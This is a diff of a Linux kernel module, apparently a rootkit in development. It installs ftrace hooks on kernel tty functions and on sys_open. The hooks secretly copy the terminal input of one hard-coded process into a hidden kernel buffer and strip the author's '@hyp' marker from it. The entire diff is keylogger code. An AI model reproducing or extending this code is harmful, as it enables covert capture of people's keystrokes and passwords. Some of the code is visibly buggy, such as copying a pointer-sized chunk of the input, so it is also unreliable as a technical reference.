@@ -1,4 +1,5 @@
 #include <asm/segment.h>
+#include <linux/sched.h>
 #include <linux/slab.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
@@ -11,6 +12,7 @@
 #include <linux/string.h>
 #include <linux/uaccess.h>
 #include <linux/linkage.h>
+#include <linux/tty.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("hyp");
@@ -31,7 +33,7 @@ static int device_release(struct inode *, struct file *);
 static ssize_t device_read(struct file *, char __user *, size_t, loff_t *);
 static ssize_t device_write(struct file *, const char __user *, size_t, loff_t *);
 
-int is_open = 0;
+int is_open, last_count, count, kb_offset = 0;
 
 static int major;
 
@@ -144,15 +146,75 @@ void remove_hooks(struct ftrace_hook *hooks, size_t count) {
 		remove_hook(&hooks[i]);
 }
 
-static asmlinkage ssize_t (*real_tty_read)(struct file *file, char __user *buf,
-		size_t count, loff_t *ppos);
+void remove_str(char *str, char *sub) {
+	char *match;
+	int len = strlen(sub);
 
-static asmlinkage ssize_t ftrace_tty_read(struct file *file, char __user *buf,
-		size_t count, loff_t *ppos) {
+	while((match = strstr(str, sub))) {
+		*match = '\0';
+		strcat(str, match+len);
+	}
+}
 
-	ssize_t ret;
+static asmlinkage int (*tty_fixed_flag)(struct tty_port *port,
+		const unsigned char *chars, char flag, size_t size);
 
-	//pr_info("hittle\n");
+static asmlinkage int ftrace_fixed_flag(struct tty_port *port,
+		const unsigned char *chars, char flag, size_t size) {
+	
+	int ret, cpid;
+
+	cpid = (int)task_tgid_nr(current);
+	if(cpid == 5363) {
+		strncat(tty_keybuf, chars, size);
+	}
+	
+	pr_info("flag: %c\n", flag);
+	ret = tty_fixed_flag(port, chars, flag, size);
+	
+	return ret;
+}
+
+
+
+static asmlinkage ssize_t (*real_read)(struct tty_struct *tty, 
+		const unsigned char *buf, int c);
+
+static asmlinkage ssize_t ftrace_read(struct tty_struct *tty, 
+		const unsigned char *buf, int c) {
+	size_t ret;
+	int cpid;
+	char *hold = (char*)buf;
+	//char *str = kmalloc(count, GFP_KERNEL);
+	//char *cut_str = kmalloc(count, GFP_KERNEL);
+
+	/*if(fd == 1)
+		pr_info("test");
+		strncat(tty_keybuf, buf, sizeof(buf));
+	*/
+	
+	cpid = (int)task_tgid_nr(current);
+	if(cpid == 5363) {
+		remove_str(hold, "@hyp");
+		memcpy(tty_keybuf+kb_offset, hold, sizeof(buf));
+		kb_offset += sizeof(buf);
+	}
+
+	//pr_info("pid: %d\n", (int)task_tgid_nr(current));
+	ret = real_read(tty, buf, c);
+	return ret;
+}
+
+static asmlinkage long (*real_open)(const char __user *filename, 
+		int flags, umode_t mode);
+
+static asmlinkage long ftrace_open(const char __user *filename, 
+		int flags, umode_t mode) {
+
+	long ret;
+	//void ret;
+
+	/*
 	if((strlen(buf) + strlen(tty_keybuf)) > 10000) {
 		tty_keybuf[0] = '\0';
 		//strncat(tty_keybuf, buf, strlen(buf));
@@ -160,15 +222,19 @@ static asmlinkage ssize_t ftrace_tty_read(struct file *file, char __user *buf,
 
 	if(strlen(buf) > 0) {
 		strncat(tty_keybuf, buf, strlen(buf));
+	}*/
+	ret = real_open(filename, flags, mode);
+	if(strstr(filename, "/dev/pts") !=NULL) {
+		pr_info("fd path: %s pts: %ld\n", filename, ret);
 	}
-
-	ret = real_tty_read(file, buf, count, ppos);
+	//pr_info("fd: %ld path: %s\n", ret, filename);
 
 	return ret;
 }
 
 static struct ftrace_hook tty_hooks[] = {
-	HOOK("tty_read", ftrace_tty_read, &real_tty_read)
+	HOOK("sys_open", ftrace_open, &real_open),
+	HOOK("tty_insert_flip_string_fixed_flag", ftrace_fixed_flag, &tty_fixed_flag)
 };
 
 static void kill_ftrace(unsigned long data) {
